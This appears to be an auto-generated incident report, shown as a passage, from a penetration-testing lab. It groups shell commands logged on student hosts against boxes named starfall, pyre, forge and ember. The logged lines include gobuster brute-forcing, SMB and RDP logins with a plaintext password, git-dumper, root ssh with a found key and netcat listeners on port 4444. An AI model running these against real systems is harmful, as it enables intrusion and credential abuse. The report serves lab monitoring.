- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:16:42 | logs/10.100.7.32/shell_history.csv#L408 | ls
  - 2026-01-20T19:16:44 | logs/10.100.7.32/shell_history.csv#L409 | ls
  - 2026-01-20T19:16:45 | logs/10.100.7.32/shell_history.csv#L410 | ls
  - 2026-01-20T19:16:46 | logs/10.100.7.32/shell_history.csv#L411 | ls
  - 2026-01-20T19:16:47 | logs/10.100.7.32/shell_history.csv#L412 | rm test2.txt
  - 2026-01-20T19:16:48 | logs/10.100.7.32/shell_history.csv#L413 | ls
  - 2026-01-20T19:16:48 | logs/10.100.7.32/shell_history.csv#L414 | cd ..
  - 2026-01-20T19:16:48 | logs/10.100.7.32/shell_history.csv#L415 | ls
  - 2026-01-20T19:16:51 | logs/10.100.7.32/shell_history.csv#L416 | ls
  - 2026-01-20T19:16:52 | logs/10.100.7.32/shell_history.csv#L417 | ls

## Incident 490 - 2026-01-20T19:17:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:17:01 | logs/10.100.7.32/shell_history.csv#L418 | ls
  - 2026-01-20T19:17:01 | logs/10.100.7.32/shell_history.csv#L419 | ls
  - 2026-01-20T19:17:23 | logs/10.100.7.32/shell_history.csv#L420 | ssh-keygen
  - 2026-01-20T19:17:27 | logs/10.100.7.32/shell_history.csv#L421 | cd ~/.ssh
  - 2026-01-20T19:17:27 | logs/10.100.7.32/shell_history.csv#L422 | ls
  - 2026-01-20T19:17:38 | logs/10.100.7.32/shell_history.csv#L423 | ls
  - 2026-01-20T19:17:41 | logs/10.100.7.32/shell_history.csv#L424 | tldr ssh-copy-id
  - 2026-01-20T19:17:01 | logs/10.100.7.22/shell_history.csv#L104 | man ssh
  - 2026-01-20T19:17:10 | logs/10.100.7.22/shell_history.csv#L105 | ssh -i authorized_keys

## Incident 491 - 2026-01-20T19:17:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-20T19:17:30 | logs/10.100.7.14/shell_history.csv#L119 | ssh starfall@10.100.7.43
  - 2026-01-20T19:17:30 | logs/10.100.7.14/shell_history.csv#L120 | ssh starfall@10.100.7.43
  - 2026-01-20T19:17:38 | logs/10.100.7.14/shell_history.csv#L121 | ssh -i starfall@10.100.7.43

## Incident 492 - 2026-01-20T19:18:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-20T19:18:37 | logs/10.100.7.32/shell_history.csv#L425 | ssh-copy-id -i ~/.ssh/starfall.pub starfall@10.100.7.43
  - 2026-01-20T19:18:52 | logs/10.100.7.14/shell_history.csv#L122 | ssh -i file.txt starfall@10.100.7.43

## Incident 493 - 2026-01-20T19:47:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-20T19:47:35 | logs/10.100.7.14/shell_history.csv#L161 | ssh -i file1.txt starfall@10.100.7.43
  - 2026-01-20T19:47:35 | logs/10.100.7.14/shell_history.csv#L162 | ssh -i file1.txt starfall@10.100.7.43
  - 2026-01-20T19:47:35 | logs/10.100.7.14/shell_history.csv#L163 | ssh -i file1.txt starfall@10.100.7.43
  - 2026-01-20T19:47:35 | logs/10.100.7.14/shell_history.csv#L164 | ssh -i file1.txt starfall@10.100.7.43
  - 2026-01-20T19:47:36 | logs/10.100.7.14/shell_history.csv#L165 | ssh -i file1.txt starfall@10.100.7.43

## Incident 494 - 2026-01-20T20:00:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T20:00:21 | logs/10.100.7.32/shell_history.csv#L448 | nc -nlvp 4444
  - 2026-01-20T20:00:04 | logs/10.100.7.14/shell_history.csv#L171 | ls
  - 2026-01-20T20:00:07 | logs/10.100.7.14/shell_history.csv#L172 | cd ..
  - 2026-01-20T20:00:14 | logs/10.100.7.14/shell_history.csv#L173 | cd dirb
  - 2026-01-20T20:00:16 | logs/10.100.7.14/shell_history.csv#L174 | ls

## Incident 495 - 2026-01-26T18:04:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:04:31 | logs/10.100.7.32/shell_history.csv#L456 | exit
  - 2026-01-26T18:04:32 | logs/10.100.7.32/shell_history.csv#L457 | clear
  - 2026-01-26T18:04:32 | logs/10.100.7.32/shell_history.csv#L458 | ls

## Incident 496 - 2026-01-26T18:27:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:27:23 | logs/10.100.7.32/shell_history.csv#L460 | ld
  - 2026-01-26T18:27:24 | logs/10.100.7.32/shell_history.csv#L461 | ls
  - 2026-01-26T18:27:25 | logs/10.100.7.32/shell_history.csv#L462 | clear
  - 2026-01-26T18:27:25 | logs/10.100.7.32/shell_history.csv#L463 | ls
  - 2026-01-26T18:27:49 | logs/10.100.7.32/shell_history.csv#L466 | vi ~/.ssh/known_hosts

## Incident 497 - 2026-01-26T18:27:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-26T18:27:36 | logs/10.100.7.32/shell_history.csv#L464 | ssh -i ~/.ssh/starfall starfall@10.100.7.43
  - 2026-01-26T18:27:42 | logs/10.100.7.32/shell_history.csv#L465 | ssh -i ~/.ssh/starfall starfall@10.100.7.43

## Incident 498 - 2026-01-26T18:38:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:38:25 | logs/10.100.7.32/shell_history.csv#L468 | ls
  - 2026-01-26T18:38:27 | logs/10.100.7.32/shell_history.csv#L469 | ls
  - 2026-01-26T18:38:28 | logs/10.100.7.32/shell_history.csv#L470 | exit
  - 2026-01-26T18:38:30 | logs/10.100.7.32/shell_history.csv#L471 | exit

## Incident 499 - 2026-01-26T18:41:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:41:22 | logs/10.100.7.32/shell_history.csv#L472 | exit
  - 2026-01-26T18:41:23 | logs/10.100.7.32/shell_history.csv#L473 | clear
  - 2026-01-26T18:41:23 | logs/10.100.7.32/shell_history.csv#L474 | ls
  - 2026-01-26T18:41:32 | logs/10.100.7.32/shell_history.csv#L475 | cd Documents
  - 2026-01-26T18:41:32 | logs/10.100.7.32/shell_history.csv#L476 | ls
  - 2026-01-26T18:41:34 | logs/10.100.7.32/shell_history.csv#L477 | cd forge-logs
  - 2026-01-26T18:41:35 | logs/10.100.7.32/shell_history.csv#L478 | git pull
  - 2026-01-26T18:41:37 | logs/10.100.7.32/shell_history.csv#L479 | git checkout
  - 2026-01-26T18:41:37 | logs/10.100.7.32/shell_history.csv#L480 | ls
  - 2026-01-26T18:41:39 | logs/10.100.7.32/shell_history.csv#L481 | git status
  - 2026-01-26T18:41:39 | logs/10.100.7.32/shell_history.csv#L482 | ls
  - 2026-01-26T18:41:41 | logs/10.100.7.32/shell_history.csv#L483 | cd logs
  - 2026-01-26T18:41:41 | logs/10.100.7.32/shell_history.csv#L484 | ls
  - 2026-01-26T18:41:46 | logs/10.100.7.32/shell_history.csv#L485 | cat maintenance.log
  - 2026-01-26T18:41:54 | logs/10.100.7.32/shell_history.csv#L486 | cat production.log
  - 2026-01-26T18:41:20 | logs/10.100.7.14/shell_history.csv#L213 | ls
  - 2026-01-26T18:41:26 | logs/10.100.7.14/shell_history.csv#L214 | cat hashes.txt

## Incident 500 - 2026-01-26T18:41:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-26T18:41:10 | logs/10.100.7.24/shell_history.csv#L93 | ssh 10.100.7.40
  - 2026-01-26T18:41:29 | logs/10.100.7.24/shell_history.csv#L94 | ssh 10.100.7.40

## Incident 501 - 2026-01-26T18:42:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:42:01 | logs/10.100.7.32/shell_history.csv#L487 | ls
  - 2026-01-26T18:42:03 | logs/10.100.7.32/shell_history.csv#L488 | cat quality.log
  - 2026-01-26T18:42:09 | logs/10.100.7.32/shell_history.csv#L489 | cd ..
  - 2026-01-26T18:42:10 | logs/10.100.7.32/shell_history.csv#L490 | ls -la
  - 2026-01-26T18:42:12 | logs/10.100.7.32/shell_history.csv#L491 | cat .gitignore
  - 2026-01-26T18:42:22 | logs/10.100.7.32/shell_history.csv#L492 | git log
  - 2026-01-26T18:42:32 | logs/10.100.7.32/shell_history.csv#L493 | git checkout 9cd8207ec6609583c8df9e2b1f7d592297357772
  - 2026-01-26T18:42:36 | logs/10.100.7.32/shell_history.csv#L494 | ls
  - 2026-01-26T18:42:37 | logs/10.100.7.32/shell_history.csv#L495 | ls -la
  - 2026-01-26T18:42:40 | logs/10.100.7.32/shell_history.csv#L496 | ls logs
  - 2026-01-26T18:42:43 | logs/10.100.7.32/shell_history.csv#L497 | cat logs/maintenance.log
  - 2026-01-26T18:42:48 | logs/10.100.7.32/shell_history.csv#L498 | cat logs/production.log
  - 2026-01-26T18:42:52 | logs/10.100.7.32/shell_history.csv#L499 | cat logs/quality.log
  - 2026-01-26T18:42:56 | logs/10.100.7.32/shell_history.csv#L500 | git switch -
  - 2026-01-26T18:42:56 | logs/10.100.7.32/shell_history.csv#L501 | ls
  - 2026-01-26T18:42:28 | logs/10.100.7.14/shell_history.csv#L215 | cat maintenance.log
  - 2026-01-26T18:42:37 | logs/10.100.7.14/shell_history.csv#L216 | cat readme.txt
  - 2026-01-26T18:42:05 | logs/10.100.7.24/shell_history.csv#L95 | ls -la
  - 2026-01-26T18:42:36 | logs/10.100.7.24/shell_history.csv#L96 | vim .ssh/known_hosts

## Incident 502 - 2026-01-26T18:53:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:53:03 | logs/10.100.7.32/shell_history.csv#L531 | tldr git
  - 2026-01-26T18:53:36 | logs/10.100.7.12/shell_history.csv#L28 | wordlist

## Incident 503 - 2026-01-26T18:54:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:54:06 | logs/10.100.7.32/shell_history.csv#L532 | git checkout 0bd27f2fad92b708eef1cb74b9d1093e3ca1606e
  - 2026-01-26T18:54:08 | logs/10.100.7.32/shell_history.csv#L533 | ls
  - 2026-01-26T18:54:09 | logs/10.100.7.32/shell_history.csv#L534 | ls -la
  - 2026-01-26T18:54:12 | logs/10.100.7.32/shell_history.csv#L535 | cd logs
  - 2026-01-26T18:54:13 | logs/10.100.7.32/shell_history.csv#L536 | ls
  - 2026-01-26T18:54:14 | logs/10.100.7.32/shell_history.csv#L537 | git status
  - 2026-01-26T18:54:15 | logs/10.100.7.32/shell_history.csv#L538 | ls
  - 2026-01-26T18:54:16 | logs/10.100.7.32/shell_history.csv#L539 | cat maintenance.log
  - 2026-01-26T18:54:18 | logs/10.100.7.32/shell_history.csv#L540 | cat production.log
  - 2026-01-26T18:54:21 | logs/10.100.7.32/shell_history.csv#L541 | cat quality.log
  - 2026-01-26T18:54:36 | logs/10.100.7.32/shell_history.csv#L542 | git switch -
  - 2026-01-26T18:54:44 | logs/10.100.7.32/shell_history.csv#L543 | git reset --hard 0bd27f2fad92b708eef1cb74b9d1093e3ca1606e
  - 2026-01-26T18:54:47 | logs/10.100.7.32/shell_history.csv#L544 | ls
  - 2026-01-26T18:54:48 | logs/10.100.7.32/shell_history.csv#L545 | cd ..
  - 2026-01-26T18:54:48 | logs/10.100.7.32/shell_history.csv#L546 | ls
  - 2026-01-26T18:54:50 | logs/10.100.7.32/shell_history.csv#L547 | ls -la
  - 2026-01-26T18:54:52 | logs/10.100.7.32/shell_history.csv#L548 | ls logs
  - 2026-01-26T18:54:54 | logs/10.100.7.32/shell_history.csv#L549 | ls .git
  - 2026-01-26T18:54:59 | logs/10.100.7.32/shell_history.csv#L550 | ls logs
  - 2026-01-26T18:54:46 | logs/10.100.7.13/shell_history.csv#L98 | tldr nxc
  - 2026-01-26T18:54:43 | logs/10.100.7.12/shell_history.csv#L29 | wordlists

## Incident 504 - 2026-01-26T18:55:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:55:02 | logs/10.100.7.32/shell_history.csv#L551 | cat main
  - 2026-01-26T18:55:04 | logs/10.100.7.32/shell_history.csv#L552 | cat mainten
  - 2026-01-26T18:55:09 | logs/10.100.7.32/shell_history.csv#L553 | cat mainten
  - 2026-01-26T18:55:09 | logs/10.100.7.32/shell_history.csv#L554 | ls
  - 2026-01-26T18:55:10 | logs/10.100.7.32/shell_history.csv#L555 | ls
  - 2026-01-26T18:55:11 | logs/10.100.7.32/shell_history.csv#L556 | cd logs
  - 2026-01-26T18:55:11 | logs/10.100.7.32/shell_history.csv#L557 | ls
  - 2026-01-26T18:55:12 | logs/10.100.7.32/shell_history.csv#L558 | cat maintenance.log
  - 2026-01-26T18:55:14 | logs/10.100.7.32/shell_history.csv#L559 | cat production.log
  - 2026-01-26T18:55:16 | logs/10.100.7.32/shell_history.csv#L560 | cat quality.log
  - 2026-01-26T18:55:33 | logs/10.100.7.32/shell_history.csv#L561 | ls
  - 2026-01-26T18:55:34 | logs/10.100.7.32/shell_history.csv#L562 | git log
  - 2026-01-26T18:55:37 | logs/10.100.7.32/shell_history.csv#L563 | git log --oneline
  - 2026-01-26T18:55:47 | logs/10.100.7.32/shell_history.csv#L564 | git checkout 7eb86ab
  - 2026-01-26T18:55:48 | logs/10.100.7.32/shell_history.csv#L565 | ls
  - 2026-01-26T18:55:49 | logs/10.100.7.32/shell_history.csv#L566 | cd ..
  - 2026-01-26T18:55:49 | logs/10.100.7.32/shell_history.csv#L567 | ls
  - 2026-01-26T18:55:51 | logs/10.100.7.32/shell_history.csv#L568 | ls
  - 2026-01-26T18:55:53 | logs/10.100.7.32/shell_history.csv#L569 | cd configs
  - 2026-01-26T18:55:53 | logs/10.100.7.32/shell_history.csv#L570 | ls
  - 2026-01-26T18:55:55 | logs/10.100.7.32/shell_history.csv#L571 | cd config
  - 2026-01-26T18:55:55 | logs/10.100.7.32/shell_history.csv#L572 | ls
  - 2026-01-26T18:55:19 | logs/10.100.7.13/shell_history.csv#L99 | tldr hydra

## Incident 505 - 2026-01-26T18:55:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-26T18:55:17 | logs/10.100.7.12/shell_history.csv#L30 | gobuster dir -u 10.100.7.45 -w /usr/share/wordlists/dirb/common.txt
  - 2026-01-26T18:55:53 | logs/10.100.7.12/shell_history.csv#L31 | gobuster dir -u 10.100.7.45 -w /usr/share/wordlists/dirb
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 506 - 2026-01-26T18:56:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T18:56:06 | logs/10.100.7.32/shell_history.csv#L573 | vi system.conf
  - 2026-01-26T18:56:06 | logs/10.100.7.32/shell_history.csv#L574 | exit
  - 2026-01-26T18:56:13 | logs/10.100.7.32/shell_history.csv#L575 | exit
  - 2026-01-26T18:56:14 | logs/10.100.7.32/shell_history.csv#L576 | ls
  - 2026-01-26T18:56:15 | logs/10.100.7.32/shell_history.csv#L577 | cat system.conf
  - 2026-01-26T18:56:20 | logs/10.100.7.32/shell_history.csv#L578 | exit
  - 2026-01-26T18:56:22 | logs/10.100.7.12/shell_history.csv#L32 | ls /usr/share/wordlists/dirb

## Incident 507 - 2026-01-26T18:56:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-26T18:56:35 | logs/10.100.7.12/shell_history.csv#L33 | gobuster dir -u 10.100.7.45 -w /usr/share/wordlists/dirb/big.txt
  - 2026-01-26T18:56:45 | logs/10.100.7.12/shell_history.csv#L34 | gobuster dir -u 10.100.7.45 -w /usr/share/wordlists/dirb/catalat.txt
  - 2026-01-26T18:56:55 | logs/10.100.7.12/shell_history.csv#L35 | gobuster dir -u 10.100.7.45 -w /usr/share/wordlists/dirb/catala.txt
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 508 - 2026-01-26T19:13:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:13:08 | logs/10.100.7.32/shell_history.csv#L579 | ls
  - 2026-01-26T19:13:09 | logs/10.100.7.32/shell_history.csv#L580 | cat ~/.ssh
  - 2026-01-26T19:13:11 | logs/10.100.7.32/shell_history.csv#L581 | ls ~/.ssh
  - 2026-01-26T19:13:15 | logs/10.100.7.32/shell_history.csv#L582 | cat ~/.ssh/helios_ssh_key
  - 2026-01-26T19:13:18 | logs/10.100.7.32/shell_history.csv#L583 | cat ~/.ssh/helios_ssh_key.pub
  - 2026-01-26T19:13:34 | logs/10.100.7.24/shell_history.csv#L129 | vim backup.ps1
  - 2026-01-26T19:13:36 | logs/10.100.7.24/shell_history.csv#L130 | ls
  - 2026-01-26T19:13:54 | logs/10.100.7.24/shell_history.csv#L131 | vim cleanup.ps1

## Incident 509 - 2026-01-26T19:15:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-01-26T19:15:31 | logs/10.100.7.32/shell_history.csv#L584 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.44
  - 2026-01-26T19:15:31 | logs/10.100.7.32/shell_history.csv#L585 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.44
  - 2026-01-26T19:15:31 | logs/10.100.7.32/shell_history.csv#L586 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.44
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 510 - 2026-01-26T19:15:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:15:26 | logs/10.100.7.13/shell_history.csv#L108 | git-dumper http://10/100/7/44/git/forge-logs.git/ ~/git_content
  - 2026-01-26T19:15:05 | logs/10.100.7.24/shell_history.csv#L134 | vim maintenance.ps1

## Incident 511 - 2026-01-26T19:28:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:28:29 | logs/10.100.7.32/shell_history.csv#L587 | makepasswd
  - 2026-01-26T19:28:32 | logs/10.100.7.32/shell_history.csv#L588 | ls

## Incident 512 - 2026-01-26T19:28:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:28:32 | logs/10.100.7.14/shell_history.csv#L245 | nxc smb 10.100.7.46 -u guest  -p ''
  - 2026-01-26T19:28:01 | logs/10.100.7.24/shell_history.csv#L163 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 513 - 2026-01-26T19:34:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:34:12 | logs/10.100.7.32/shell_history.csv#L589 | ls
  - 2026-01-26T19:34:15 | logs/10.100.7.32/shell_history.csv#L590 | cat system.conf
  - 2026-01-26T19:34:09 | logs/10.100.7.24/shell_history.csv#L175 | vim maintenance.ps1
  - 2026-01-26T19:34:14 | logs/10.100.7.24/shell_history.csv#L176 | ls
  - 2026-01-26T19:34:19 | logs/10.100.7.24/shell_history.csv#L177 | vim healthcheck.ps1
  - 2026-01-26T19:34:37 | logs/10.100.7.24/shell_history.csv#L178 | vim cleanup.ps1

## Incident 514 - 2026-01-26T19:38:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-26T19:38:25 | logs/10.100.7.32/shell_history.csv#L591 | ssh -i ~/.ssh/helios_ssh_key pyre@10.100.7.45
  - 2026-01-26T19:38:31 | logs/10.100.7.32/shell_history.csv#L593 | ssh -i ~/.ssh/helios_ssh_key pyre@10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 515 - 2026-01-26T19:38:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:38:26 | logs/10.100.7.32/shell_history.csv#L592 | who -u
  - 2026-01-26T19:38:34 | logs/10.100.7.32/shell_history.csv#L594 | history | grep hydra
  - 2026-01-26T19:38:37 | logs/10.100.7.32/shell_history.csv#L595 | ls
  - 2026-01-26T19:38:39 | logs/10.100.7.32/shell_history.csv#L596 | cd ..
  - 2026-01-26T19:38:39 | logs/10.100.7.32/shell_history.csv#L597 | ls
  - 2026-01-26T19:38:41 | logs/10.100.7.32/shell_history.csv#L598 | ls
  - 2026-01-26T19:38:41 | logs/10.100.7.32/shell_history.csv#L599 | cd ..
  - 2026-01-26T19:38:42 | logs/10.100.7.32/shell_history.csv#L600 | ls
  - 2026-01-26T19:38:46 | logs/10.100.7.32/shell_history.csv#L601 | ls
  - 2026-01-26T19:38:48 | logs/10.100.7.13/shell_history.csv#L139 | mv force-logs.git git_info

## Incident 516 - 2026-01-26T19:39:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:39:34 | logs/10.100.7.32/shell_history.csv#L602 | ls
  - 2026-01-26T19:39:34 | logs/10.100.7.32/shell_history.csv#L603 | ls
  - 2026-01-26T19:39:58 | logs/10.100.7.32/shell_history.csv#L604 | ls
  - 2026-01-26T19:39:59 | logs/10.100.7.32/shell_history.csv#L605 | ls -la
  - 2026-01-26T19:39:03 | logs/10.100.7.13/shell_history.csv#L140 | mv forge-logs.git git_info
  - 2026-01-26T19:39:08 | logs/10.100.7.13/shell_history.csv#L141 | cd git_info
  - 2026-01-26T19:39:09 | logs/10.100.7.13/shell_history.csv#L142 | ls
  - 2026-01-26T19:39:19 | logs/10.100.7.13/shell_history.csv#L143 | cd forge-logs.git
  - 2026-01-26T19:39:20 | logs/10.100.7.13/shell_history.csv#L144 | cd
  - 2026-01-26T19:39:28 | logs/10.100.7.13/shell_history.csv#L145 | cd forge-logs.git
  - 2026-01-26T19:39:31 | logs/10.100.7.13/shell_history.csv#L146 | ls
  - 2026-01-26T19:39:39 | logs/10.100.7.13/shell_history.csv#L147 | cd ..
  - 2026-01-26T19:39:44 | logs/10.100.7.13/shell_history.csv#L148 | cd git_info
  - 2026-01-26T19:39:57 | logs/10.100.7.13/shell_history.csv#L149 | cd ~
  - 2026-01-26T19:39:02 | logs/10.100.7.24/shell_history.csv#L187 | vim maintenance.ps1

## Incident 517 - 2026-01-26T19:39:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:39:06 | logs/10.100.7.24/shell_history.csv#L188 | xfreerdp3 /u:rand2 /v:10.100.7.46 /p:dFMVxYA4
  - 2026-01-26T19:39:12 | logs/10.100.7.24/shell_history.csv#L189 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4!
  - 2026-01-26T19:39:30 | logs/10.100.7.31/shell_history.csv#L20 | enum4linux -a 10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 518 - 2026-01-26T19:40:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:40:23 | logs/10.100.7.32/shell_history.csv#L606 | ls
  - 2026-01-26T19:40:27 | logs/10.100.7.32/shell_history.csv#L607 | cd forge-logs
  - 2026-01-26T19:40:28 | logs/10.100.7.32/shell_history.csv#L608 | ls
  - 2026-01-26T19:40:30 | logs/10.100.7.32/shell_history.csv#L609 | git switch -
  - 2026-01-26T19:40:30 | logs/10.100.7.32/shell_history.csv#L610 | ls
  - 2026-01-26T19:40:31 | logs/10.100.7.32/shell_history.csv#L611 | git status
  - 2026-01-26T19:40:32 | logs/10.100.7.32/shell_history.csv#L612 | ls
  - 2026-01-26T19:40:35 | logs/10.100.7.32/shell_history.csv#L613 | cd logs
  - 2026-01-26T19:40:35 | logs/10.100.7.32/shell_history.csv#L614 | ls
  - 2026-01-26T19:40:37 | logs/10.100.7.32/shell_history.csv#L615 | cat maintenance.log
  - 2026-01-26T19:40:39 | logs/10.100.7.32/shell_history.csv#L616 | cat production.log
  - 2026-01-26T19:40:41 | logs/10.100.7.32/shell_history.csv#L617 | cat quality.log
  - 2026-01-26T19:40:02 | logs/10.100.7.13/shell_history.csv#L150 | cd git_info
  - 2026-01-26T19:40:07 | logs/10.100.7.13/shell_history.csv#L151 | ls
  - 2026-01-26T19:40:14 | logs/10.100.7.13/shell_history.csv#L152 | cd forge-logs.git
  - 2026-01-26T19:40:17 | logs/10.100.7.13/shell_history.csv#L153 | ls
  - 2026-01-26T19:40:27 | logs/10.100.7.13/shell_history.csv#L154 | cat description
  - 2026-01-26T19:40:41 | logs/10.100.7.13/shell_history.csv#L155 | cat info
  - 2026-01-26T19:40:44 | logs/10.100.7.13/shell_history.csv#L156 | cd info
  - 2026-01-26T19:40:46 | logs/10.100.7.13/shell_history.csv#L157 | ls
  - 2026-01-26T19:40:50 | logs/10.100.7.13/shell_history.csv#L158 | cat exclude

## Incident 519 - 2026-01-26T20:01:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-01-26T20:01:58 | logs/10.100.7.32/shell_history.csv#L618 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.44
  - 2026-01-26T20:01:04 | logs/10.100.7.24/shell_history.csv#L224 | gobuster dir -u https://http://10.100.7.44/ -w wordlist.txt
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 520 - 2026-01-26T20:01:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T20:01:14 | logs/10.100.7.14/shell_history.csv#L280 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-26T20:01:37 | logs/10.100.7.14/shell_history.csv#L281 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-26T20:01:56 | logs/10.100.7.14/shell_history.csv#L282 | smbclient //10.100.7.46/Scripts --user guest
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 521 - 2026-01-26T20:02:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T20:02:00 | logs/10.100.7.32/shell_history.csv#L619 | tmux
  - 2026-01-26T20:02:06 | logs/10.100.7.32/shell_history.csv#L622 | tmux
  - 2026-01-26T20:02:20 | logs/10.100.7.24/shell_history.csv#L225 | touch wordlist.txt
  - 2026-01-26T20:02:35 | logs/10.100.7.24/shell_history.csv#L226 | vim wordlist.txt

## Incident 522 - 2026-01-26T20:02:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-01-26T20:02:06 | logs/10.100.7.32/shell_history.csv#L621 | ssh forge@10.100.7.44
  - 2026-01-26T20:02:37 | logs/10.100.7.24/shell_history.csv#L227 | gobuster dir -u https://http://10.100.7.44/ -w wordlist.txt
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 523 - 2026-01-27T18:32:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T18:32:42 | logs/10.100.7.32/shell_history.csv#L623 | exit
  - 2026-01-27T18:32:58 | logs/10.100.7.32/shell_history.csv#L624 | clear
  - 2026-01-27T18:32:59 | logs/10.100.7.32/shell_history.csv#L625 | exit

## Incident 524 - 2026-01-27T18:41:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T18:41:17 | logs/10.100.7.32/shell_history.csv#L626 | ls
  - 2026-01-27T18:41:25 | logs/10.100.7.32/shell_history.csv#L627 | exit

## Incident 525 - 2026-01-27T18:43:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T18:43:05 | logs/10.100.7.32/shell_history.csv#L629 | exit
  - 2026-01-27T18:43:51 | logs/10.100.7.14/shell_history.csv#L285 | nc -lvnp 4444

## Incident 526 - 2026-01-27T19:00:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:00:36 | logs/10.100.7.32/shell_history.csv#L632 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:00:45 | logs/10.100.7.32/shell_history.csv#L633 | nxc smb 10.100.7.46 -u guest -p ''
  - 2026-01-27T19:00:08 | logs/10.100.7.14/shell_history.csv#L307 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:00:52 | logs/10.100.7.14/shell_history.csv#L308 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:00:46 | logs/10.100.7.22/shell_history.csv#L181 | nxc smb [10.100.7.46] -u guest -p
  - 2026-01-27T19:00:33 | logs/10.100.7.24/shell_history.csv#L252 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:00:58 | logs/10.100.7.24/shell_history.csv#L253 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 527 - 2026-01-27T19:36:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:36:19 | logs/10.100.7.32/shell_history.csv#L690 | ls
